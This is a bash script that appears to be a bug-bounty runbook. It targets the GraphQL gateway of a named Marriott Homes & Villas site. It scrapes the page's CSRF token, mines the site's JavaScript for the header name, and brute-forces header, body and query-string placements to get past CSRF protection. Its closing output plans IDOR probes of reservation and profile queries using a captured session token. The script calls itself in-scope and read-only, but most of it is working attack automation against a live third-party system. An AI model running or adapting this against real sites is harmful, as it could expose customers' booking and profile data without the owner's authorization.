#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV GraphQL CSRF cracker v3 (session40)  — definitive
# Portable: Linux / Pi / Termux.
#
# s39 facts: csrfToken lives in Next.js __NEXT_DATA__ (fresh per page load);
# /get/refreshtoken needs a session (hvmi_signInToken); 13 header names rejected.
# Two root causes: (1) stale token vs jar mismatch + jar polluted by refreshtoken,
# (2) real header name unknown (only in minified Apollo setup).
#
# This run:
#   A. ONE clean homepage fetch -> extract THAT response's __NEXT_DATA__ csrfToken
#   B. Find the EXACT header name: download JS, dump context around
#      "/gateway/graphql" and "csrfToken" (Apollo setContext/header setup)
#   C. Immediate replay with the fresh token + same jar (no refreshtoken),
#      trying header names found in B + a wide list, plus body _csrf and ?_csrf
#   Stop the moment we get past "CSRF token not found".
#
# SAFETY: in-scope, read-only query (introspection / public op), synthetic ids,
# no mutations, stop-on-PII. X-Bug-Bounty header.
#
# Run (Termux): OUTDIR=$HOME/s40 bash runbooks/PI-RUNBOOK-session40-hnv-csrf3.sh \
#                 2>&1 | tee $HOME/s40/s40.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s40
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s40"
  else OUTDIR="$HOME/s40"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"

echo "============================================================"
echo "HNV CSRF v3  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

# ── B-first: download JS once (needs a homepage to list them), reused below ──
echo "═══ PHASE A: ONE CLEAN FETCH + FRESH TOKEN ═══"
rm -f "$JAR"
curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" \
  -w '  GET / -> %{http_code} | %{size_download}B\n' || true
TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
echo "  fresh __NEXT_DATA__ csrfToken: ${TOK:0:38}${TOK:+...}"
echo "  jar cookies: $(awk 'NF>=7{printf "%s ",$6}' "$JAR" 2>/dev/null)"
echo ""

echo "═══ PHASE B: FIND THE REAL HEADER NAME IN JS ═══"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
h=open(os.path.join(O,"home.html"),encoding="utf-8",errors="replace").read()
js=sorted(set(re.findall(r'src=["\']([^"\']+\.m?js)(?:\?[^"\']*)?["\']',h,re.I)))
open(os.path.join(O,"js.txt"),"w").write("\n".join(js)); print(f"  {len(js)} js refs")
PYEOF
: > "$OUTDIR/alljs.txt"; i=0
while read -r J && [ $i -lt 16 ]; do
  [ -z "$J" ] && continue
  case "$J" in http*) U="$J";; /*) U="$B$J";; *) U="$B/$J";; esac
  curl -s --max-time 20 -b "$JAR" -H "User-Agent: $UA" -H "$IDH" "$U" >> "$OUTDIR/alljs.txt" 2>/dev/null || true
  i=$((i+1)); sleep 0.15
done < "$OUTDIR/js.txt"
echo "  mined $(wc -c < "$OUTDIR/alljs.txt" 2>/dev/null||echo 0) bytes"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
js=open(os.path.join(O,"alljs.txt"),encoding="utf-8",errors="replace").read()
found=set()
# context around the gateway endpoint + csrfToken — header literal lives here
for needle in ["/gateway/graphql","csrfToken"]:
    for m in re.finditer(re.escape(needle), js):
        ctx=js[max(0,m.start()-160):m.end()+160]
        print(f"  «{needle}» ...{ctx.replace(chr(10),' ')[:300]}")
        # header-name-like literals in the window
        for s in re.findall(r'["\']([A-Za-z][A-Za-z0-9_-]{2,30})["\']\s*[:,]\s*[A-Za-z_$]', ctx):
            if re.search(r'csrf|xsrf|token|verif|head',s,re.I): found.add(s)
# global: any literal assigned the csrfToken variable -> headers["NAME"]=...csrf
for m in re.finditer(r'["\']([A-Za-z][A-Za-z0-9_-]{2,30})["\']\s*[:=]\s*[A-Za-z_$.]{0,20}[cC]srf', js):
    found.add(m.group(1))
print("\n  >>> candidate REQUEST header names:", sorted(found) or "(none — eyeball context above)")
open(os.path.join(O,"hdrnames.txt"),"w").write("\n".join(sorted(found)))
PYEOF
echo ""

echo "═══ PHASE C: IMMEDIATE REPLAY (fresh token, same jar) ═══"
Q='{"query":"query{__schema{queryType{name}}}"}'
NAMES="$(tr '\n' ' ' < "$OUTDIR/hdrnames.txt" 2>/dev/null) csrf-token x-csrf-token X-CSRF-TOKEN csrfToken csrftoken x-csrftoken xsrf-token x-xsrf-token X-XSRF-TOKEN _csrf csrf token x-token apollo-csrf-token graphql-csrf-token"
WIN=""
try() { # description  curl-args...
  local d="$1"; shift
  local m; m=$(curl -s -o "$OUTDIR/g.txt" -b "$JAR" \
     -H "User-Agent: $UA" -H "$IDH" -H 'Content-Type: application/json' \
     -H 'Accept: application/json' -H "Origin: $B" -H "Referer: $B/" \
     "$@" --max-time 20 -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0")
  local body; body=$(head -c 90 "$OUTDIR/g.txt"|tr '\n' ' ')
  printf '  %-34s -> %s|%sB :: %s\n' "$d" "${m%|*}" "${m#*|}" "$body"
  if [ -s "$OUTDIR/g.txt" ] && ! grep -q 'CSRF token not found' "$OUTDIR/g.txt" 2>/dev/null; then
    WIN="$d"; cp "$OUTDIR/g.txt" "$OUTDIR/csrf-passed.json"; return 0; fi
  return 1
}
# header attempts
for N in $NAMES; do
  [ -z "$N" ] && continue
  try "hdr:$N" -H "$N: $TOK" --data "$Q" && break
  sleep 0.25
done
# body + query attempts
if [ -z "$WIN" ]; then
  try "body:_csrf"   --data "{\"_csrf\":\"$TOK\",\"query\":\"query{__schema{queryType{name}}}\"}" || true
  [ -z "$WIN" ] && try "query:_csrf" -H "csrf-token: $TOK" --data "$Q" "$B/gateway/graphql?_csrf=$TOK" || true
fi
echo ""

echo "════════════════════════════════════════════"
if [ -n "$WIN" ]; then
  echo "  *** PAST CSRF via [$WIN]. Response:"
  head -c 1400 "$OUTDIR/csrf-passed.json"; echo
  echo "  >>> Map id-bearing queries; test public ops then reservationDetails/"
  echo "  >>> getProfileDetails with synthetic id. Session-gated user ops => capture"
  echo "  >>> hvmi_signInToken via browser for the authenticated IDOR test."
else
  echo "  CSRF STILL not matched across all header/body/query placements + JS-derived"
  echo "  names. Conclusion: the token is almost certainly validated against a"
  echo "  server-side session (no CSRF cookie is set unauthenticated), so the gateway"
  echo "  is effectively session-gated. NEXT: capture ONE real browser request to"
  echo "  /gateway/graphql (DevTools/HAR) to read the exact header, OR log into HnV"
  echo "  and replay with hvmi_signInToken. Review Phase B context lines first."
fi
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
